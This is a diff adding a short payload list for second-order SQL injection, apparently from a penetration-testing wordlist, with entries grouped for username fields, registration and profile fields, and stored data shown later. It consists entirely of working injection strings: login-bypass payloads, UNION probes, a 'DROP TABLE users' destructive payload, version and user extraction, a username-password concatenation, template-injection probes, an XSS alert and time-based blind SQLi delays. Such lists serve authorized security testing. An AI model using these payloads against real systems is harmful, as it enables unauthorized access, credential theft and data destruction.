@@ -1,0 +1,23 @@
+# Second Order SQLi
+# These are stored and executed later
+
+# Username field payloads
+admin'--
+admin'#
+admin' OR '1'='1
+admin' AND 1=1--
+admin' UNION SELECT 1,2,3--
+test' OR '1'='1' --
+user'); DROP TABLE users;--
+
+# Registration/Profile fields
+' + (SELECT @@version) + '
+' + (SELECT user()) + '
+concat(username,':',password)
+${7*7}
+{{7*7}}
+
+# Stored data that triggers on display
+<script>alert(1)</script>' OR '1'='1
+'; WAITFOR DELAY '0:0:5'--
+' OR sleep(5)#
